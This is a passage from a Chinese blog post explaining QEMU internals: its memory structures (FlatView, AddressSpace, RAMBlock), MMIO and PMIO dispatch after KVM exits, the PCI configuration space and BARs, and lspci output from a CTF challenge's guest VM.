<p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong>，我们可以把一组端口理解为 QEMU 视角的一块 Guest 内存。</p>
<h4 id="FlatView"><a href="#FlatView" class="headerlink" title="FlatView"></a>FlatView</h4><p><code>FlatView</code> 用来表示<strong>一棵 MemoryRegion 树所表示的 Guest 地址空间</strong>，其使用一个 <code>FlatRange</code> 结构体指针数组来存储不同 <code>MemoryRegion</code> 对应的地址信息，每个 <code>FlatRange</code> 表示单个 <code>MemoryRegion</code> 的 <strong>Guest 视角的一块物理地址空间</strong>以及是否只读等特性信息， <code>FlatRange</code> 之间所表示的地址范围不会重叠。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Range of memory in the global map.  Addresses are absolute. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatRange</span> &#123;</span></span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    hwaddr offset_in_region;</span><br><span class="line">    AddrRange addr;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> readonly;</span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flattened global view of current active memory hierarchy.  Kept in sorted</span></span><br><span class="line"><span class="comment"> * order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> ref;</span><br><span class="line">    FlatRange *ranges;</span><br><span class="line">    <span class="type">unsigned</span> nr;</span><br><span class="line">    <span class="type">unsigned</span> nr_allocated;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSpaceDispatch</span> *<span class="title">dispatch</span>;</span></span><br><span class="line">    MemoryRegion *root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="AddressSpace"><a href="#AddressSpace" class="headerlink" title="AddressSpace"></a>AddressSpace</h4><p><code>AddressSpace</code> 结构体用以表示 <strong>Guest 视角不同类型的地址空间</strong>，在 x86 下其实就只有两种：<code>address_space_memory</code> 与 <code>address_space_io</code>。</p>
<p>单个 <code>AddressSpace</code> 结构体与一棵 MemoryRegion 树的根节点相关联，并使用一个 <code>FlatView</code> 结构体建立该树的平坦化内存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct AddressSpace: describes a mapping of addresses to #MemoryRegion objects</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddressSpace</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    MemoryRegion *root;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Accessed via RCU.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> *<span class="title">current_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ioeventfd_nb;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionIoeventfd</span> *<span class="title">ioeventfds</span>;</span></span><br><span class="line">    QTAILQ_HEAD(, MemoryListener) listeners;</span><br><span class="line">    QTAILQ_ENTRY(AddressSpace) address_spaces_link;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<p>最终可以得到这样一张图:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-02_211734.png" alt=""></p>
<h3 id="HOST视角"><a href="#HOST视角" class="headerlink" title="HOST视角"></a>HOST视角</h3><h4 id="RAMBlock"><a href="#RAMBlock" class="headerlink" title="RAMBlock"></a>RAMBlock</h4><p>用于表示:<strong>MR 对应的 Host 虚拟内存</strong></p>
<p><code>RAMBlock</code> 结构体用来表示<strong>单个实体 MemoryRegion 所占用的 Host 虚拟内存信息</strong>，多个 <code>RAMBlock</code> 结构体之间构成单向链表。</p>
<p>比较重要的成员如下：</p>
<ul>
<li><code>mr</code>：该 RAMBlock 对应的 MemoryRegion（即 HVA → GPA）</li>
<li><code>host</code>：GVA 对应的 HVA，通常由 QEMU 通过 <code>mmap()</code> 获得（如果未使用 KVM）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RAMBlock</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> *<span class="title">mr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *host;</span><br><span class="line">    <span class="type">uint8_t</span> *colo_cache; <span class="comment">/* For colo, VM&#x27;s ram cache */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> used_length;</span><br><span class="line">    <span class="type">ram_addr_t</span> max_length;</span><br><span class="line">    <span class="type">void</span> (*resized)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">uint64_t</span> length, <span class="type">void</span> *host);</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">/* Protected by iothread lock.  */</span></span><br><span class="line">    <span class="type">char</span> idstr[<span class="number">256</span>];</span><br><span class="line">    <span class="comment">/* RCU-enabled, writes protected by the ramlist lock */</span></span><br><span class="line">    QLIST_ENTRY(RAMBlock) next;</span><br><span class="line">    QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">size_t</span> page_size;</span><br><span class="line">    <span class="comment">/* dirty bitmap used during migration */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *bmap;</span><br><span class="line">    <span class="comment">/* bitmap of already received pages in postcopy */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *receivedmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bitmap to track already cleared dirty bitmap.  When the bit is</span></span><br><span class="line"><span class="comment">     * set, it means the corresponding memory chunk needs a log-clear.</span></span><br><span class="line"><span class="comment">     * Set this up to non-NULL to enable the capability to postpone</span></span><br><span class="line"><span class="comment">     * and split clearing of dirty bitmap on the remote node (e.g.,</span></span><br><span class="line"><span class="comment">     * KVM).  The bitmap will be set only when doing global sync.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It is only used during src side of ram migration, and it is</span></span><br><span class="line"><span class="comment">     * protected by the global ram_state.bitmap_mutex.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> this bitmap is different comparing to the other bitmaps</span></span><br><span class="line"><span class="comment">     * in that one bit can represent multiple guest pages (which is</span></span><br><span class="line"><span class="comment">     * decided by the `clear_bmap_shift&#x27; variable below).  On</span></span><br><span class="line"><span class="comment">     * destination side, this should always be NULL, and the variable</span></span><br><span class="line"><span class="comment">     * `clear_bmap_shift&#x27; is meaningless.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *clear_bmap;</span><br><span class="line">    <span class="type">uint8_t</span> clear_bmap_shift;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RAM block length that corresponds to the used_length on the migration</span></span><br><span class="line"><span class="comment">     * source (after RAM block sizes were synchronized). Especially, after</span></span><br><span class="line"><span class="comment">     * starting to run the guest, used_length and postcopy_length can differ.</span></span><br><span class="line"><span class="comment">     * Used to register/unregister uffd handlers and as the size of the received</span></span><br><span class="line"><span class="comment">     * bitmap. Receiving any page beyond this length will bail out, as it</span></span><br><span class="line"><span class="comment">     * could not have been valid on the source.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> postcopy_length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对应关系如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-02_211915.png" alt=""></p>
<h2 id="设备模型"><a href="#设备模型" class="headerlink" title="设备模型"></a>设备模型</h2><p>QEMU 在用户空间中独立进行设备模拟，虚拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p>
<h3 id="IO处理"><a href="#IO处理" class="headerlink" title="IO处理"></a>IO处理</h3><p>当 VM 在访问某一虚拟设备对应的物理内存 / 端口时，控制权由 VM 转交到 Hypervisor，此时 QEMU 会根据触发 VM-exit 的事件类型进行不同的处理。</p>
<blockquote>
<p>accel/kvm/kvm-all.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kvm_cpu_exec</span><span class="params">(CPUState *cpu)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VCPU 退出运行，处理对应事件</span></span><br><span class="line"></span><br><span class="line">        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_io\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            kvm_handle_io(run-&gt;io.port, attrs,</span><br><span class="line">                          (<span class="type">uint8_t</span> *)run + run-&gt;io.data_offset,</span><br><span class="line">                          run-&gt;io.direction,</span><br><span class="line">                          run-&gt;io.size,</span><br><span class="line">                          run-&gt;io.count);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_MMIO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_mmio\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            address_space_rw(&amp;address_space_memory,</span><br><span class="line">                             run-&gt;mmio.phys_addr, attrs,</span><br><span class="line">                             run-&gt;mmio.data,</span><br><span class="line">                             run-&gt;mmio.len,</span><br><span class="line">                             run-&gt;mmio.is_write);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<h4 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h4><p>对于 MMIO 而言会调用到 <code>address_space_rw()</code> 函数，该函数会先将全局地址空间 <code>address_space_memory</code> 展开成 <code>FlatView</code> 后再调用对应的函数进行读写操作。</p>
<blockquote>
<p>softmmu/physmem.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">MemTxResult <span class="title function_">address_space_read_full</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                    MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_read(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_write</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_write(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_rw</span><span class="params">(AddressSpace *as, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                             <span class="type">void</span> *buf, hwaddr len, <span class="type">bool</span> is_write)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_write) &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>操作函数最后会根据 <code>FlatView</code> 找到目标内存对应的 <code>MemoryRegion</code>，对于函数表中定义了读写指针的 MR 而言最后会调用对应的函数指针完成内存访问工作，代码过多这里就不继续展开了：</p>
<blockquote>
<p>softmmu/physmem.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_write</span><span class="params">(FlatView *fv, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                  <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">true</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_write_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                   addr1, l, mr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_read</span><span class="params">(FlatView *fv, hwaddr addr,</span></span><br><span class="line"><span class="params">                                 MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">false</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_read_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                  addr1, l, mr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h4><p>对于 <code>PMIO</code> 而言会调用到 <code>kvm_handle_io()</code> 函数，该函数实际上也是对 <code>address_space_rw()</code> 的封装，只不过使用的是<strong>端口地址空间</strong> <code>address_space_io</code>，最后也会调用到对应 <code>MemoryRegion</code> 的函数表中的读写函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_handle_io</span><span class="params">(<span class="type">uint16_t</span> port, MemTxAttrs attrs, <span class="type">void</span> *data, <span class="type">int</span> direction,</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> size, <span class="type">uint32_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        address_space_rw(&amp;address_space_io, port, attrs,</span><br><span class="line">                         ptr, size,</span><br><span class="line">                         direction == KVM_EXIT_IO_OUT);</span><br><span class="line">        ptr += size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pci设备地址空间"><a href="#pci设备地址空间" class="headerlink" title="pci设备地址空间"></a>pci设备地址空间</h2><blockquote>
<p>PCI（Peripheral Component Interconnect，外设组件互联）设备是一种计算机硬件设备，通过PCI总线与计算机的主板连接。PCI设备可以包括各种外部设备，如网卡、显卡、声卡、硬盘控制器、USB控制器等。PCI设备可以直接与计算机的主板连接，或者通过PCI插槽连接到主板上。PCI总线是一种高速数据传输接口，使得PCI设备可以与计算机进行快速的数据交换，从而实现各种输入输出功能。PCI设备的规范已经被不断发展和扩展，其中包括PCI Express（PCIe）等更高性能的接口。</p>
</blockquote>
<p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-19_163506.png" alt=""></p>
<p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-19_163623.png" alt=""></p>
<p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。</p>
<p>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</p>
<p>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p>
<p>通过memory space访问设备I/O的方式称为memory mapped I/O，即<strong>MMIO</strong>，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p>
<p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，即<strong>PMIO</strong>,这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p>
<p>关于MMIO和PMIO，维基百科的描述是：</p>
<blockquote>
<p>Memory-mapped I/O (MMIO) and port-mapped I/O (PMIO) (which is also called isolated I/O) are two complementary methods of performing input/output (I/O) between the central processing unit (CPU) and peripheral devices in a computer. An alternative approach is using dedicated I/O processors, commonly known as channels on mainframe computers, which execute their own instructions.</p>
<p>翻译来自谷歌</p>
<p>内存映射 I/O (MMIO) 和端口映射 I/O (PMIO)（也称为隔离 I/O）是在中央处理单元 (CPU) 之间执行输入/输出 (I/O) 的两种互补方法。 ）和计算机中的外围设备。 另一种方法是使用专用 I/O 处理器，通常称为大型计算机上的通道，它们执行自己的指令。</p>
</blockquote>
<p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p>
<p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p>
<h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>下面通过在qemu虚拟机中查看pci设备来进一步增进理解，仍然是基于strng这道题的qemu虚拟机。</p>
<p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>
<p>pci设备的寻址是由总线、设备以及功能构成。如下所示：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure>
<p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p>
<p>可以使用lspci命令以树状的形式输出pci结构：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -t -v</span><br><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure>
<p>其中<code>[0000]</code>表示pci的域， PCI域最多可以承载256条总线。 每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p>
